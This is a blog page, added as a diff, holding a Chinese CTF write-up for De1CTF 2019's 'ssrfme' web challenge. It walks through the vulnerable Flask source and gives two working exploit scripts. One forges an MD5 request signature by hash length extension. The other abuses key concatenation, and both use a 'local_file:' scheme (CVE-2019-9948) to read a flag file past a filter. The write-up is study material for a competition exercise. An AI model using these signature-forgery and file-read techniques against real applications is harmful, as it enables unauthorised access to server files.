@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="对未来的最大慷慨，就是把一切都献给现在。">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Luc1fer">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="De1ctf">
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="对未来的最大慷慨，就是把一切都献给现在。">
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="Luc1fer&#39;blog">
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article">
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary">
+    
+
+    <!-- Title -->
+    
+    <title>De1ctf - Luc1fer&#39;blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories/">
+                    Categories
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2019/08/16/De1ctf/">
+                De1ctf
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-08-16</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/wp/">wp</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p>这次比赛真的超有意思的！我超级喜欢的！做了半天啥都没做出来，看着那个樱花🌸全程陶醉~</p>
+<a id="more"></a>
+<h1 id="De1ctf-2019-WP"><a href="#De1ctf-2019-WP" class="headerlink" title="De1ctf 2019 WP"></a>De1ctf 2019 WP</h1><h2 id="ssrfme"><a href="#ssrfme" class="headerlink" title="ssrfme"></a>ssrfme</h2><p>源码 </p>
+<pre><code>#! /usr/bin/env python
+#encoding=utf-8
+from flask import Flask
+from flask import request
+import socket
+import hashlib
+import urllib
+import sys
+import os
+import json
+reload(sys)
+sys.setdefaultencoding(&apos;latin1&apos;)
+
+app = Flask(__name__)
+
+secert_key = os.urandom(16)
+
+
+class Task:
+    def __init__(self, action, param, sign, ip):
+        self.action = action
+        self.param = param
+        self.sign = sign
+        self.sandbox = md5(ip)
+        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
+            os.mkdir(self.sandbox)
+
+    def Exec(self):
+        result = {}
+        result[&apos;code&apos;] = 500
+        if (self.checkSign()):
+            if &quot;scan&quot; in self.action:
+                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)
+                resp = scan(self.param)
+                if (resp == &quot;Connection Timeout&quot;):
+                    result[&apos;data&apos;] = resp
+                else:
+                    print resp
+                    tmpfile.write(resp)
+                    tmpfile.close()
+                result[&apos;code&apos;] = 200
+            if &quot;read&quot; in self.action:
+                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)
+                result[&apos;code&apos;] = 200
+                result[&apos;data&apos;] = f.read()
+            if result[&apos;code&apos;] == 500:
+                result[&apos;data&apos;] = &quot;Action Error&quot;
+        else:
+            result[&apos;code&apos;] = 500
+            result[&apos;msg&apos;] = &quot;Sign Error&quot;
+        return result
+
+    def checkSign(self):
+        if (getSign(self.action, self.param) == self.sign):
+            return True
+        else:
+            return False
+
+
+#generate Sign For Action Scan.
+@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])
+def geneSign():
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    action = &quot;scan&quot;
+    return getSign(action, param)
+
+
+@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])
+def challenge():
+    action = urllib.unquote(request.cookies.get(&quot;action&quot;))
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))
+    ip = request.remote_addr
+    if(waf(param)):
+        return &quot;No Hacker!!!!&quot;
+    task = Task(action, param, sign, ip)
+    return json.dumps(task.Exec())
+@app.route(&apos;/&apos;)
+def index():
+    return open(&quot;code.txt&quot;,&quot;r&quot;).read()
+
+
+def scan(param):
+    socket.setdefaulttimeout(1)
+    try:
+        return urllib.urlopen(param).read()[:50]
+    except:
+        return &quot;Connection Timeout&quot;
+
+
+
+def getSign(action, param):
+    return hashlib.md5(secert_key + param + action).hexdigest()
+
+
+def md5(content):
+    return hashlib.md5(content).hexdigest()
+
+
+def waf(param):
+    check=param.strip().lower()
+    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):
+        return True
+    else:
+        return False
+
+
+if __name__ == &apos;__main__&apos;:
+    app.debug = False
+    app.run(host=&apos;0.0.0.0&apos;,port=80)</code></pre><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p><code>Exec()</code>函数首先调用<code>checkSign()</code>进行md5校验，我们可以通过长度扩展攻击绕过。接下来对scan行为进行打开文本文件，调用<code>scan()</code>读取内容，然后将目标文件内容写入文件。对read行为进行刚刚写入文件的读取。</p>
+<pre><code>def Exec(self):
+    result = {}
+    result[&apos;code&apos;] = 500
+    if (self.checkSign()):
+        if &quot;scan&quot; in self.action:
+            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)
+            resp = scan(self.param)
+            if (resp == &quot;Connection Timeout&quot;):
+                result[&apos;data&apos;] = resp
+            else:
+                print resp
+                tmpfile.write(resp)
+                tmpfile.close()
+            result[&apos;code&apos;] = 200
+        if &quot;read&quot; in self.action:
+            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)
+            result[&apos;code&apos;] = 200
+            result[&apos;data&apos;] = f.read()
+        if result[&apos;code&apos;] == 500:
+            result[&apos;data&apos;] = &quot;Action Error&quot;
+    else:
+        result[&apos;code&apos;] = 500
+        result[&apos;msg&apos;] = &quot;Sign Error&quot;
+    return result
+
+def checkSign(self):
+    if (getSign(self.action, self.param) == self.sign):
+        return True
+    else:
+        return False</code></pre><p><code>/geneSign</code>路由负责生成Sign。同时<code>action</code>被限定为<code>scan</code></p>
+<pre><code>#generate Sign For Action Scan.
+@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])
+def geneSign():
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    action = &quot;scan&quot;
+    return getSign(action, param)</code></pre><p><code>/De1ta</code>路由对请求的<code>param</code>参数进行检查，然后通过对<code>Task</code>类传入相应参数打印<code>Exec()</code>函数的结果</p>
+<pre><code>@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])
+def challenge():
+    action = urllib.unquote(request.cookies.get(&quot;action&quot;))
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))
+    ip = request.remote_addr
+    if(waf(param)):
+        return &quot;No Hacker!!!!&quot;
+    task = Task(action, param, sign, ip)
+    return json.dumps(task.Exec())</code></pre><p><code>scan()</code>函数打开<code>param</code>指向的内容进行读取，这是我们利用<code>ssrf</code>的点。</p>
+<pre><code>def scan(param):
+    socket.setdefaulttimeout(1)
+    try:
+        return urllib.urlopen(param).read()[:50]
+    except:
+        return &quot;Connection Timeout&quot;</code></pre><p>getSign()函数对<code>secerty_key,param,action</code>进行md5加密。</p>
+<pre><code>def getSign(action, param):
+    return hashlib.md5(secert_key + param + action).hexdigest()</code></pre><p>代码的逻辑大体上是</p>
+<pre><code>初始化各个参数-&gt;进入Task类-&gt;执行Exec()函数-&gt;检查md5值-&gt;对参数中的action进行不同操作-&gt;dump函数执行结果</code></pre><p>我们可以通过长度扩展攻击绕过长度判断，根据提示flag在<code>/flag.txt</code>，我们可以读取这个文件，但是<code>waf()</code>对<code>gopher</code>和<code>file</code>进行过滤，我们无法利用这两个协议，根据CVE-2019-9948(urllib)<a href="https://www.cvedetails.com/cve/CVE-2019-9948/" title="CVE-2019-9948" target="_blank" rel="noopener">https://www.cvedetails.com/cve/CVE-2019-9948/</a>我们可以通过<code>local_file:///flag.txt</code>来绕过waf。</p>
+<h3 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h3><pre><code>import urllib,hashpumpy 
+import requests
+
+&quot;&quot;&quot;
+    hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)
+
+    Arguments:
+        hexdigest(str):      Hex-encoded result of hashing key + original_data.
+        original_data(str):  Known data used to get the hash result hexdigest.
+        data_to_add(str):    Data to append
+        key_length(int):     Length of unknown data prepended to the hash
+
+    Returns:
+        A tuple containing the new hex digest and the new message.
+
+&quot;&quot;&quot;
+
+url = &quot;http://139.180.128.86/&quot;
+
+#get the Sign of Scan
+geneSign = &quot;geneSign?&quot;
+payload = &quot;local_file:flag.txt&quot;
+re = requests.get(url+geneSign+&quot;param=&quot;+payload).text
+print re
+
+#hash extend attack
+hashs,hashextend = hashpumpy.hashpump(re,payload+&quot;scan&quot;,&quot;read&quot;,16)
+print hashs
+action = &quot;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read&quot;
+cookie = {
+    #&quot;action&quot;:urllib.quote(hashextend),
+    &quot;action&quot;:action,    
+    &quot;sign&quot;:hashs
+}
+print cookie
+
+
+re2 = requests.get(url+&apos;De1ta?&apos;+&quot;param=&quot;+payload,cookies=cookie)
+
+print re2.content</code></pre><p>在使用扩展攻击的时候我们需要把所得签名前面的信息去掉</p>
+<pre><code>Input Signature: 785f9921864e8704e5e44e15c8f3d6ce
+Input Data: local_file:flag.txtscan
+Input Key Length: 16
+Input Data to Add: read
+636d649a50e61e75436cc1ba50d5a003
+local_file:flag.txtscan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x008\x01\x00\x00\x00\x00\x00\x00read</code></pre><h3 id="another-way"><a href="#another-way" class="headerlink" title="another way"></a>another way</h3><p>在ctf time上看到的回答，分析的好细致<a href="https://ctftime.org/writeup/16070" target="_blank" rel="noopener">https://ctftime.org/writeup/16070</a>。这里提供了另一种思路</p>
+<blockquote>
+<p>This will allow us to read the flag into a file, but we will not be able to read it without a valid sign with the action including “read”. If we can generate a sign for the action as “readscan”, we can perform the scan and read the result in one go.</p>
+<p>Notice, geneSign() will perform an md5 hash of secret + param + action so we can pass the value of param as “flag.txtread” (the value of action will be “scan”) and generate the same hash as if we pass param as “flag.txt” and action as “readscan”.</p>
+<p>“flag.txtread”+”scan” == “flag.txt”+”readscan”</p>
+<p>You could also use a length extension attack, but this way is more simple.</p>
+<p>So our exploit is complete.</p>
+</blockquote>
+<p>这是他们编写的脚本：膜</p>
+<pre><code>import requests
+
+def geneSign(param):
+    return requests.get(&quot;http://139.180.128.86/geneSign?param=&quot;+param).text
+
+realParam = &quot;flag.txt&quot;
+
+param = realParam+&quot;read&quot;
+sign = geneSign(param)
+param = realParam
+
+action = &quot;readscan&quot;
+
+answer = requests.get(&quot;http://139.180.128.86/De1ta?param=&quot;+param, cookies={&quot;action&quot;:action,&quot;sign&quot;:sign}).text
+
+print(answer)</code></pre>
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/ssrf/">#ssrf</a> <a href="/tags/RSA/">#RSA</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    This theme was developed by <a href="">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/31/JavaScript原型污染/">JavaScript Prototype 污染攻击</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/30/SSTI/">SSTI-服务器端模板注入</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/22/HostSplit/">HostSplit-Exploitable</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/19/Black-magic/">black_magic</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
+        
+        <li>
+            <a class="footer-post" href="/categories/比赛回顾/">比赛回顾</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/docker/">docker</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/wp/">wp</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/渗透测试/">渗透测试</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/BrainLyh">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:brainsemail@163.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
